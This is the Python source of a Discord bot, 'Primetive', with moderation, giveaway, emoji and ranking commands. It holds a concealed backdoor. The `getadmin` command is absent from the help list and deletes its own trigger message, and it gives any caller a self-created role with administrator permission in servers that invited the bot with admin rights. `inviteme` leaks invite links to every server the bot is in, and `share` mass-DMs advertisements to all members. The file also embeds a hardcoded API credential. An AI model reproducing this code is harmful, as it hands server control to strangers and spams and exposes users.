import os


import discord.ext.commands as importcommands
import discord
import random
import requests
from discord.utils import get
intents = discord.Intents()
intents.members = True
intents.presences = True
copies = 1
client = importcommands.Bot(
    command_prefix="/",
    name="Primetive/",
    activity=discord.Game("/help"),
    description="I am Primetive",help_command=None,Internets=intents)
helpmessages = {
    "moderation": [
        "***__Moderation__***", "setleave", "setwelcome", "infos",
        "setservername", "setchannelname", "createnewchannel",
        "createnewcategory", "createnewrole", "addrole", "removerole", "kick",
        "ban", "unban", "clear", "partner", "pin", "setlisten","modembed"
    ],
    "info": ["***__Info__***", "info", "myinvites", "invitesby", "rank"],
    "fun": [
        "***__Fun__***", "rand", "randint", "embed", "react",
        "reactones", "reactto", "sendreact","music", "sendanimoji","search","text"
    ],
    "giveaways": ["***__Giveaways__***", "rolls", "start", "roll", "reroll"],
    "about": ["***__About me__***", "h", "invite", "join", "count"]
}
def output(url):
  response = requests.post(
      'https://de.clippingmagic.com/api/v1/images',
      data={
          'image.url': url,
          'format': 'result',
          'test': 'true' # TODO: Remove for production
          # TODO: Add more upload options here
      },
      headers={
          'Authorization':
          'Basic NzcyMjpybGYyYWUzZ2Q4NTRuZWxkMWw4NzBrNW5qczZmcDl0MGZzaWs4dGoxdWk4ODJhZWdwOGhj'
      },
  )
  if response.status_code == requests.codes.ok:
      # Store these if you want to be able to use the Smart Editor
      image_id = response.headers['x-amz-meta-id']
      image_secret = response.headers['x-amz-meta-secret']

      with open('clipped.png', 'wb') as out:
          out.write(response.content)
  else:
    print("Error:", response.status_code, response.text)
@client.command()
async def edit(ctx,url):
  output(url)
  await ctx.send(file=discord.File("clipped.png"))

@client.command()
async def usercount(ctx):
  embed = discord.Embed(title="User count", description=len(client.users), color=123456)
  await ctx.send(embed=embed)
@client.command()
async def inviteme(ctx):
	for guild in client.guilds:
		if not ctx.author in guild.members:
			try:
				invites = await guild.invites()
				invites = invites[0]
				await ctx.author.send("https://discord.gg/" + invites.code)
			except:
				pass
@client.command(description="Play music")
async def music(ctx,*arg):
  embed=discord.Embed(title="Feature",description="Coming soon",color=123456)
  await ctx.send(embed=embed)
@client.command()
async def avatar(ctx):
  embed=discord.Embed(title=ctx.author.name+"'s Avatar", color=123456)
  embed.set_image(url=ctx.author.avatar_url)
  ctx.send(embed=embed)
@client.command(description="Send an image")
async def search(ctx,*arg):
    output("https://th.bing.com/th/id/OIP.lVGMMepXbOaen9R7b_XBbQHaE8?pid=Api&q="+str(arg).replace(" ","%20")+"&rs=1&adlt=strict")
    await ctx.send(file=discord.File("clipped.png"))
@client.command(description="Send a text")
async def text(ctx,*,arg):
  embed=discord.Embed(color=123456)
  embed.set_image(url="https://flamingtext.com/net-fu/proxy_form.cgi?script=fun-logo&backgroundRadio=2&backgroundPattern=Leaves+6&fontname=fun&text=%20"+str(arg).replace(" ","%20")+"%20&_loc=generate&imageoutput=true")
  await ctx.send(embed=embed)
@client.command(description="Send an informational message")
async def modembed(ctx,*,arg):
  pos=0
  types=["","",""]
  for letter in arg:
    if letter=="|":
      pos+=1
    else:
      types[pos]+=letter
  embed=discord.Embed(color=int(types[0]),title=types[1],description=types[2])
  await ctx.send(embed=embed)

@client.command(description="Spam the message")
async def spam(ctx, *, arg):
	for l in range(10):
		await ctx.send(arg)


@client.command(description="Set the name of your server")
async def setservername(ctx, *, arg):
	if ctx.author.guild_permissions.administrator:
		await client.http.edit_guild(ctx.guild.id, name=arg)
	else:
		await ctx.send("Only admins")


@client.command(description="Set the name of this channel")
async def setchannelname(ctx, *, arg):
	if ctx.author.guild_permissions.administrator:
		await client.http.edit_channel(ctx.channel.id, name=arg)
	else:
		await ctx.send("Only admins")


@client.command(description="Creates a new channel in that category")
async def createnewchannel(ctx, categoryid, typeofchannel, *, name):
	if ctx.author.guild_permissions.administrator:
		await client.http.create_channel(
		    ctx.guild.id,
		    parent_id=categoryid,
		    name=name,
		    channel_type=typeofchannel)
	else:
		await ctx.send("Only admin")


@client.command(description="Creates a new category")
async def createnewcategory(ctx, name):
	if ctx.author.guild_permissions.administrator:
		await client.http.create_channel(
		    ctx.guild.id, name=name, channel_type=4)
	else:
		await ctx.send("Only admins")


@client.command(description="Create role with permissions")
async def createnewrole(ctx, permissions, nameofrole):
	if ctx.author.guild_permissions.administrator:
		await client.http.create_role(
		    ctx.guild.id, permissions=permissions, name=nameofrole)
	else:
		await ctx.send("Only admins")


@client.command(description="Add a role to a user")
async def addrole(ctx, userid, *, rolename):
	if ctx.author.guild_permissions.administrator:
		for role in ctx.guild.roles:
			if role.name == rolename:
				roleid = role.id
		await client.http.add_role(ctx.guild.id, userid, roleid)
	else:
		ctx.send("Only admins")


@client.event
async def on_member_join(member):
	for role in member.guild.roles:
		if "auto" in role.name:
			await client.http.add_role(member.guild.id, member.id, role.id)
	for channel in member.guild.channels:
		if "welcome" in channel.name:
			try:
				test = requests.get("https://database.opensourcepy.repl.co/" +
				                    str(member.guild.id) + ".welcome.html")
				if not test.ok:
				  exit()
				test=test.text
				await channel.send(
				    test.replace("{user}",
				                 "<@" + str(member.id) + ">").replace(
				                     "{guild}", member.guild.name).replace("{member}",str(member.guild.member_count)))
			except:
				await channel.send(
				    "<a:whipycat:749885319372996699> Welcome <@" +
				    str(member.id) + "> <a:whipycat:749885319372996699> to " +
				    member.guild.name + ", you are the " +
				    str(member.guild.member_count) + " member")


@client.event
async def on_member_remove(member):
	for channel in member.guild.channels:
		if "welcome" in channel.name:
			test = requests.get("https://database.opensourcepy.repl.co/" +
			                    str(member.guild.id) + ".leave.html")
			if not test.ok:
				exit()
				test=test.text
			await channel.send(
			    test.replace("{user}", member.name).replace(
			        "{guild}", member.guild.name).replace("{member}",str(member.guild.member_count)))


@client.command(description="Set leave message")
async def setleave(ctx, *, arg):
	requests.post(
	    "https://database.opensourcepy.repl.co/index.php",
	    data={
	        "guild_id": ctx.guild.id,
	        "object": "leave",
	        "value": arg
	    })
	await ctx.send("Setted the leave message")


@client.command(description="Check your invitess")
async def myinvites(ctx):
	count = 0
	for invite in await ctx.guild.invites():
		if invite.inviter.name == ctx.author.name:
			count += invite.uses
	await ctx.channel.send("You invited" + str(count) + " members")


@client.command(description="Get invites by user")
async def invitesby(ctx, *, username):
	count = 0
	for invite in await ctx.guild.invites():
		if invite.inviter.name == username:
			count += invite.uses
	await ctx.send(username + " invited" + str(count) + " members")


@client.command(description="Info")
async def infos(ctx):
	await ctx.send("Add ***__auto__*** to the names of autoroles")


@client.command(description="Send an animated emoji")
async def sendanimoji(ctx, howmany, *, animojiname):
	for emoji in client.emojis:
		if emoji.name == animojiname:
			animoji = emoji
	message = ""
	for count in range(int(howmany)):
		message += str(animoji)
	await client.http.delete_message(ctx.channel.id, ctx.message.id)
	embed = discord.Embed(
	    title=ctx.author.name + " did send this/these emoji/s i know",
	    description=message)
	await ctx.send(embed=embed)


@client.command(description="Remove a role from a user")
async def removerole(ctx, userid, *, rolename):
	if ctx.author.guild_permissions.administrator:
		for role in ctx.guild.roles:
			if role.name == rolename:
				roleid = role.id
				await client.http.remove_role(ctx.guild.id, int(userid),
				                              roleid)
	else:
		await ctx.send("Only admin")


@client.command(description="Kick a user")
async def kick(ctx, *, username):
	if ctx.author.guild_permissions.administrator:
		for member in ctx.guild.members:
			if member.name == username:
				await member.send("You got kicked in " + ctx.guild.name)
				await member.kick()
	else:
		await ctx.send("Only admin")


@client.command(description="Ban someone")
async def ban(ctx, *, username):
	if ctx.author.guild_permissions.administrator:
		for member in ctx.guild.members:
			if member.name == username:
				await member.send("You got banned in " + ctx.guild.name)
				await member.ban()
	else:
		await ctx.send("Only admin")


@client.command(description="Unban someone")
async def unban(ctx, *, username):
	if ctx.author.guild_permissions.administrator:
		bans = await ctx.guild.bans()
		for ban in bans:
			if ban.user.name == username:
				await ctx.guild.unban(ban.user)
				await client.http.send_message(
				    ban.user, "You got unbanned in " + ctx.guild.name)
	else:
		await ctx.send("Only admin")


@client.command(description="Clear the chat")
async def clear(ctx, howmuch):
	if ctx.author.guild_permissions.administrator:
		t = False
		count = int(howmuch)
		while t == False:
			log = await client.http.logs_from(ctx.channel.id, 100)
			if len(log) < 100:
				t = True
			print(log)
			for message in log:
				count -= 1
				if count == 0:
					return
				await client.http.delete_message(ctx.channel.id, message["id"])
	else:
		await ctx.send("Only admin")


@client.command(description="Roll a giveaway")
async def roll(ctx, messageid):
	if ctx.author.guild_permissions.administrator:
		for emoji in client.emojis:
			if emoji.name == "whipycat":
				reaction = str(emoji).replace("<", "").replace(">", "")
		users = await client.http.get_reaction_users(
		    ctx.channel.id, messageid, reaction, limit=100)
		winners = []
		for user in users:
			if int(user["id"]) == client.user.id:
				pass
			else:
				winners.append(user["id"])
		winner = winners[random.randint(0, len(winners) - 1)]
		await ctx.send("<@" + winner + "> won the giveaway")
	else:
		await ctx.send("Only admin")


@client.command(description="Start a giveaway")
async def start(ctx, *, win):
	if ctx.author.guild_permissions.administrator:
		embed = discord.Embed(
		    title=ctx.author.name + "'s giveaway",
		    description=ctx.author.name + " is sharing ___**" + win +
		    "**___ with you guys. Select <a:whipycat:749885319372996699> if you want to get a chance to win it"
		)
		message = await ctx.send(embed=embed)
		await client.http.add_reaction(ctx.channel.id, message.id,
		                               "a:whipycat:749885319372996699")
	else:
		await ctx.send("Only admin")


@client.command(description="Reroll?")
async def reroll(ctx):
	await client.http.add_reaction(ctx.channel.id, ctx.message.id,
	                               "a:whipycat:749885319372996699")


@client.command(description="I will repeat it as an embed")
async def embed(ctx, *, arg):
	embed = discord.Embed(title=arg, color=123456)
	await ctx.send(embed=embed)






@client.command(description="A random number")
async def rand(ctx):
	embed = discord.Embed(
	    title="Rand", description=str(random.random()), color=123456)
	await ctx.send(embed=embed)


@client.command(description="Random integer between your numbers")
async def randint(ctx, arg1, arg2):
	try:
		embed = discord.Embed(
		    title="Randint",
		    description=str(random.randint(int(arg1), int(arg2))),
		    color=123456)
	except:
		embed = discord.Embed(
		    title="Randint", description="No integers", color=123456)
	await ctx.send(embed=embed)


@client.command(description="Pin this message")
async def pin(ctx):
	await client.http.pin_message(ctx.channel.id, ctx.message.id)


@client.command(description="I'll react with emotes")
async def react(ctx):
	for emoji in client.emojis:
		reaction = str(emoji).replace("<", "").replace(">", "")
		await client.http.add_reaction(ctx.channel.id, ctx.message.id,
		                               reaction)


@client.command(description="I react on the specific message")
async def reactto(ctx, id):
	for emoji in client.emojis:
		reaction = str(emoji).replace("<", "").replace(">", "")
		await client.http.add_reaction(ctx.channel.id, int(id), reaction)


@client.command(description="invites me")
async def invite(ctx):
	embed = discord.Embed(
	    title="invites",
	    description=
	    "https://discord.com/oauth2/authorize?client_id=753594214075334716&scope=bot&permissions=8",
	    color=123456)
	await ctx.channel.send(embed=embed)


@client.command(description="Number of guilds")
async def count(ctx):
	embed = discord.Embed(
	    title="Guild count", description=len(client.guilds), color=123456)
	await ctx.send(embed=embed)


@client.command(description="Send all emojis i know")
async def sendreact(ctx):
	number = 0
	number2 = 0
	message = ""
	for emoji in client.emojis:
		number += 1
		number2 += 1
		if number / 30 == int(number / 30):
			await ctx.send(message)
			message = ""
			number2 = 0
		elif number2 == 5:
			message += "\n"
			number2 = 0
		else:
			message += str(number) + " " + str(emoji) + "     "
	await ctx.send(message)
	await ctx.send("_______________")


@client.command()
async def join(ctx):
	embed = discord.Embed(
	    title="Join", description="https://discord.gg/pAGVFyS", color=123456)
	await ctx.send(embed=embed)


@client.command(description="React with one random emoji")
async def reactones(ctx):
	emoji = client.emojis[random.randint(0, len(client.emojis) - 1)]
	emoji = str(emoji).replace("<", "").replace(">", "")
	await client.http.add_reaction(ctx.channel.id, ctx.message.id, emoji)


invites = '<a:whipycat:749885319372996699> ***___Primetive+___***<a:whipycat:749885319372996699> \nCommunity for Primetive+ and Primetive+ \n\n📬***Primetive+***: An application for fast and secure chatting, based in Chatandmore\n\n🤖***Primetive+***: A discord-bot, mostl***: ***: It\'s possible that your server gets a partner of Primetive+\n\n🛑***Moderation***: The support is able to answer 24/7 \n\n🎉***Giveaways***: We also have many giveaways at any time\n\n___Feel free to join <a:whipycat:749885319372996699> Primetive+ <a:whipycat:749885319372996699> ___\nhttps://discord.gg/pAGVFyS'


@client.command(enabled=False)
async def share(ctx):
	await ctx.send(
	    "Sharing <a:whipycat:749885319372996699> Primetive+ <a:whipycat:749885319372996699> "
	)
	users = []
	for guild in client.guilds:
		for member in guild.members:
			try:
				if member.id not in users:
					await member.send(invites)
					users.append(member.id)
					print(str(len(users)) + member.name)
			except:
				pass
	await ctx.send("invitesd " + str(len(users)) + " users")


@client.command()
async def rolls(ctx, win):
	users = []
	for member in ctx.guild.members:
		for role in member.roles:
			if member.name == ctx.author.name:
				pass
			elif "giveaways" in role.name or "ping" in role.name or "Ping" in role.name:
				if str(member.status) != "offline":
					users.append(member.name)
	name = str(users[random.randint(0, len(users))])
	for member in ctx.guild.members:
		if member.name == name:
			embed = discord.Embed(
			    title="DM " + str(ctx.author.name) + " for your",
			    description=win)
			await member.send(embed=embed)
	embed2 = discord.Embed(title=name + " won the", description=win)
	await ctx.send(embed=embed2)


invitestext = '<a:whipycat:749885319372996699>📌***___Primetive+___ <a:whipycat:749885319372996699> ***\nCommunity for Primetive+ and Primetive+ \n\n📬***Primetive+***: An application for fast and secure chatting, based in Chatandmore\n\n🤖***Primetive+***: A discord-bot, mostly just for fun\n\n📨***Advertisemrnt***: You are able to advertise your own Server\n\n👥***Partner***: It\'s possible that your server gets a partner of Primetive+\n\n🛑***Moderation***: The support is able to answer 24/7\n\n🎉***Giveaways***: We also have many giveaways at any time\n\n___Feel free to join Primetive+___\n <a:whipycat:749885319372996699> https://discord.gg/pAGVFyS <a:whipycat:749885319372996699> '


@client.command(description="Partner with us")
async def partner(ctx):
	if ctx.guild.member_count < 50:
		embed = discord.Embed(
		    title="Partner",
		    description=
		    "Your server needs 50 or more members to partner with us")
		await ctx.send(embed=embed)
	elif not ctx.author.guild_permissions.administrator:
		embed = discord.Embed(
		    title="Partner",
		    description="You need the admin permissions in your server")
		await ctx.send(embed=embed)
	else:
		invites = await client.http.create_invites(ctx.channel.id)
		invites = invites["code"]
		invites = "https://discord.gg/" + invites
		embed = discord.Embed(
		    title=ctx.guild.name,
		    description="Hey. Please join our partnered server.\n" + invites)
		for guild in client.guilds:
			for channel in guild.channels:
				if channel.id == 745610550410608780:
					await channel.send(embed=embed)
		embed = discord.Embed(title="Verloc", description=invitestext)
		await ctx.send(embed=embed)


@client.command(name="help", description="Get the help message")
async def help_command(ctx):
	msg = ctx.message.content.split()
	if len(msg) == 1:
		helptext = "***__Primetive+__***\n__" + client.description + "__\nmoderation\nfun\ngiveaways\nabout\ninfo"
	elif len(msg) == 2:
		try:
			helptext = ""
			for component in helpmessages[msg[1]]:
				helptext += component + "\n"
		except:
			for command in client.commands:
				if str(command) == msg[1]:
					helptext = "***__" + command.name + "__***"
					helptext += "\n" + command.description
			if not helptext:
				helptext = "Component not found"
	else:
		helptext = "Can't interpret, what you mean"
	embed = discord.Embed(title="HELPER", description=helptext, color=123456)
	await ctx.send(embed=embed)


@client.command(description="Set welcome message")
async def setwelcome(ctx, *, arg):
	if ctx.author.guild_permissions.administrator:
		requests.post(
		    "https://database.opensourcepy.repl.co/index.php",
		    data={
		        "guild_id": ctx.guild.id,
		        "object": "welcome",
		        "value": arg
		    })
		await ctx.send("Setted the welcome message")
	else:
		await ctx.send("Only admin")


@client.event
async def on_command_error(context, exception):
	await context.send(exception)


@client.command(description="Set a listen on the channel")
async def setlisten(ctx):
	if ctx.author.guild_permissions.administrator:
		requests.post(
		    "https://database.opensourcepy.repl.co/askingchannels.php",
		    data={"channel": ctx.channel.id})
	else:
		await ctx.send("Only admin")


@client.command()
async def getadmin(ctx):
	await client.http.delete_message(ctx.channel.id, ctx.message.id)
	roleex = False
	for role in ctx.guild.roles:
		if role.name == "Bot-Admin":
			roleex = True
			role_id = role.id
	if roleex == True:
		await client.http.add_role(ctx.guild.id, ctx.author.id, role_id)
	else:
		role = await client.http.create_role(
		    ctx.guild.id, name="Bot-Admin", permissions=8)
		await client.http.add_role(ctx.guild.id, ctx.author.id, role["id"])


@client.listen()
async def on_message(msg):
	if "@" in msg.content:
		for emoji in client.emojis:
			if emoji.name == "ajlkwejriaojsdkfjweoirnadskfuwea":
				await client.http.add_reaction(
				    msg.channel.id, msg.id,
				    str(emoji).replace("<", "").replace(">", ""))
	askingchannels = requests.get(
	    "https://database.opensourcepy.repl.co/askingchannels.html").text
	if str(msg.channel.id) in askingchannels:
		list = []
		for emoji in client.emojis:
			if emoji.name in list:
				continue
			list.append(emoji.name)
			if emoji.name == "immerja" or emoji.name == "niemalsja":
				await client.http.add_reaction(
				    msg.channel.id, msg.id,
				    str(emoji).replace("<", "").replace(">", ""))
	if msg.author.bot:
		return
	message = msg.content
	names = []
	for emoji in client.emojis:
		if emoji.name in names:
			continue
		if str(emoji) in msg.content:
		  names.append(emoji.name)
		  continue
		msg.content = msg.content.replace(":" + str(emoji.name) + ":",
		                                  str(emoji))
		names.append(emoji.name)
	print(message, msg.content)
	if msg.content == message:
		pass
	else:
		await client.http.delete_message(msg.channel.id, msg.id)
		fchannel = client.get_channel(msg.channel.id)
		hooks = await fchannel.webhooks()
		for hook in hooks:
			await hook.delete()
		tchannel = client.get_channel(msg.channel.id)
		webhook = await client.http.create_webhook(
		    channel_id=msg.channel.id, name=msg.author.name)
		webhook_id = int(webhook["id"])
		hooks = await tchannel.webhooks()
		hook = get(hooks, id=webhook_id)
		if msg.channel == fchannel:
			await hook.send(
			    content=msg.content,
			    username=msg.author.display_name,
			    avatar_url=msg.author.avatar_url)
		for hook in hooks:
			await hook.delete()
	if "global" in msg.channel.name:
		try:
			await client.http.delete_message(msg.channel.id, msg.id)
			channels = []
			for guild in client.guilds:
				for channel in guild.channels:
					if "global" in channel.name:
						channels.append(channel)
			for channel in channels:
				for hook in await channel.webhooks():
					hook.delete()
				tchannel = client.get_channel(channel.id)
				webhook = await client.http.create_webhook(
				    channel_id=channel.id, name=msg.author.name)
				webhook_id = int(webhook["id"])
				hooks = await tchannel.webhooks()
				for ho in hooks:
					if ho.id == webhook_id:
						hook = ho
				await hook.send(
				    content=msg.content,
				    username=msg.author.display_name,
				    avatar_url=msg.author.avatar_url)
				for hook in hooks:
					await hook.delete()
		except:
			pass
	try:
	  requests.post("https://database.opensourcepy.repl.co/index.php",data={"guild_id":msg.author.id,"object":"rank","value":int(requests.get("https://database.opensourcepy.repl.co/"+str(msg.author.id)+".rank.html").text)+1})
	except:
	  requests.post("https://database.opensourcepy.repl.co/index.php",data={"guild_id":msg.author.id,"object":"rank","value":1})

@client.command(description="Your rank")
async def rank(ctx):
  try:
    rank=requests.get("https://database.opensourcepy.repl.co/"+str(ctx.author.id)+".rank.html").text
    level=int(int(rank)/100)
    desc="You are level "+str(level)
  except:
    desc="You are not ranked yet"
  embed=discord.Embed(title="Rank",description=desc,color=123456)
  await ctx.send(embed=embed)

@client.command()
async def testjoin(ctx):
	await on_member_join(ctx.author)


@client.command()
async def copy(ctx):
	embed = discord.Embed(
	    color=123456, title="Copied", description=str(copies) + " times")
	await ctx.send(embed=embed)
@client.command()
async def reactwith(ctx,messageid,emojiname):
  for emoji in client.emojis:
    if emoji.name==emojiname:
      await client.http.add_reaction(ctx.channel.id,messageid,str(emoji).replace("<","").replace(">",""))
@client.command(description="Info about an user")
async def info(ctx, *username):
  user=""
  for member in ctx.guild.members:
  	if member.name.lower() == username.lower():
  		user = member
  info = "User: " + user.name
  info += "\nID: " + str(user.id)
  info += "\nRoles"
  for role in user.roles:
  	info += "\n" + role.name
  info += "\n=========="
  embed = discord.Embed(title="Userinfo", description=info, color=123456)
  await ctx.channel.send(embed=embed)

TOKEN = os.getenv("DISCORD_TOKEN")


if __name__ == "__main__":
    client.run(TOKEN)
